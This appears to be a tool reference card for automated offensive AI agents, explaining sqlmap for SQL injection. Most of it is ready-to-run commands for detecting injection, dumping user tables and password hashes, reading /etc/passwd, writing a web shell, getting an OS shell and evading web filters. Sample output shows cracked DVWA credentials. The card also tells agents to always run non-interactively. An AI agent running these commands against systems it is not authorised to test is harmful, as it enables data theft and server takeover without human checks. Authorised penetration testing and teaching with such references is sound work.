---
tool_name: sqlmap
category: exploitation
tags: [sqli, sql-injection, database, blind-sqli, error-based, union-based, time-based]
used_by_agents: [sqli_agent, planner_agent]
---

# sqlmap — Automatic SQL Injection & Database Takeover

## What It Does
Automates detection and exploitation of SQL injection flaws. Supports all major injection techniques and databases (MySQL, PostgreSQL, MSSQL, Oracle, SQLite).

## CRITICAL: Always use `--batch` for non-interactive automated execution.

---

## Basic Detection

### GET parameter
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```

### POST parameter
```bash
sqlmap -u "http://target.com/page.php" --data="id=1&Submit=Submit" --batch
```

### With cookies/session
```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123;security=low" --batch
```

### Specify injectable parameter
```bash
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id --batch
```

### From a request file (captured from Burp/browser)
```bash
sqlmap -r request.txt --batch
```

---

## Injection Techniques

### Force specific technique
```bash
# B=Boolean blind, E=Error-based, U=Union, S=Stacked, T=Time-based, Q=Inline
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU --batch
```

### Increase detection level and risk
```bash
# Level 1-5 (default 1): higher = more payloads tested
# Risk 1-3 (default 1): higher = more aggressive payloads (UPDATE/INSERT)
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
```

### Second-order injection (input on one page, result on another)
```bash
sqlmap -u "http://target.com/input.php" --data="id=1" --second-url="http://target.com/result.php" --batch
```

---

## Database Enumeration

### List databases
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch --dbs
```

### List tables in a database
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch -D target_db --tables
```

### List columns in a table
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch -D target_db -T users --columns
```

### Dump table contents
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch -D target_db -T users --dump
```

### Dump specific columns
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch -D target_db -T users -C username,password --dump
```

### Current database user and database
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch --current-user --current-db
```

### Check if user is DBA
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch --is-dba
```

---

## OS-Level Access (if DBA)

### Read a file from server
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch --file-read="/etc/passwd"
```

### Write a file to server
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### OS shell
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch --os-shell
```

---

## WAF/Filter Bypass — Tamper Scripts

```bash
# Space-to-comment bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment --batch

# Multiple tamper scripts chained
sqlmap -u "http://target.com/page.php?id=1" --tamper="space2comment,between,randomcase" --batch

# Common tamper scripts:
# space2comment    — replaces spaces with /**/
# between          — replaces > with NOT BETWEEN 0 AND
# randomcase       — random case for keywords
# charencode       — URL-encode payloads
# equaltolike      — replaces = with LIKE
# base64encode     — base64 encode payloads
# apostrophemask   — replaces ' with UTF-8 equivalent
```

---

## Performance & Tuning

```bash
# Threads (faster, default 1, max 10)
sqlmap -u "http://target.com/page.php?id=1" --batch --threads=5

# Timeout per request
sqlmap -u "http://target.com/page.php?id=1" --batch --timeout=30

# Retry on connection errors
sqlmap -u "http://target.com/page.php?id=1" --batch --retries=3

# Delay between requests (seconds, avoid rate limiting)
sqlmap -u "http://target.com/page.php?id=1" --batch --delay=1

# Specify DBMS to skip fingerprinting
sqlmap -u "http://target.com/page.php?id=1" --batch --dbms=mysql
```

---

## Proxy & Headers

```bash
# Route through proxy
sqlmap -u "http://target.com/page.php?id=1" --batch --proxy="http://127.0.0.1:8080"

# Custom headers
sqlmap -u "http://target.com/page.php?id=1" --batch --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# Custom User-Agent
sqlmap -u "http://target.com/page.php?id=1" --batch --random-agent

# HTTP method override
sqlmap -u "http://target.com/page.php" --data="id=1" --method=PUT --batch
```

---

## Output Interpretation

### Successful injection detected:
```
[INFO] the back-end DBMS is MySQL
[INFO] GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5738=5738&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: id=1 AND (SELECT 1234 FROM(SELECT COUNT(*),CONCAT(...)x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1 UNION ALL SELECT CONCAT(0x716b707071,...),NULL-- -
---
```
**Success indicators**: "is vulnerable", "injection point(s)", specific technique names, payload details.

### No injection found:
```
[WARNING] GET parameter 'id' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable
```
**Failure indicators**: "does not seem to be injectable", "all tested parameters do not appear to be injectable"

### Database dump output:
```
Database: dvwa
Table: users
[5 entries]
+----+---------+---------------------------------------------+
| id | user    | password                                    |
+----+---------+---------------------------------------------+
| 1  | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| 2  | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
+----+---------+---------------------------------------------+
```

---

## Common Flags Reference

| Flag | Purpose |
|------|---------|
| `-u` | Target URL with injectable parameter |
| `--data` | POST data string |
| `-p` | Specific parameter to test |
| `-r` | Load HTTP request from file |
| `--cookie` | HTTP Cookie header value |
| `--batch` | **Non-interactive mode (ALWAYS USE)** |
| `--dbs` | Enumerate databases |
| `--tables` | Enumerate tables |
| `--columns` | Enumerate columns |
| `--dump` | Dump table data |
| `-D` | Specify database name |
| `-T` | Specify table name |
| `-C` | Specify column name(s) |
| `--technique` | SQL injection technique(s) to use |
| `--level` | Level of tests (1-5) |
| `--risk` | Risk of tests (1-3) |
| `--tamper` | Tamper script(s) for evasion |
| `--threads` | Max concurrent requests (1-10) |
| `--dbms` | Force back-end DBMS |
| `--second-url` | URL for second-order injection results |
| `--random-agent` | Random User-Agent per request |
| `--proxy` | Proxy URL |
| `--is-dba` | Check if current user is DBA |
| `--os-shell` | Interactive OS shell (if DBA) |
| `--file-read` | Read file from server filesystem |
| `--file-write` | Local file to write to server |
| `--file-dest` | Server path to write file to |
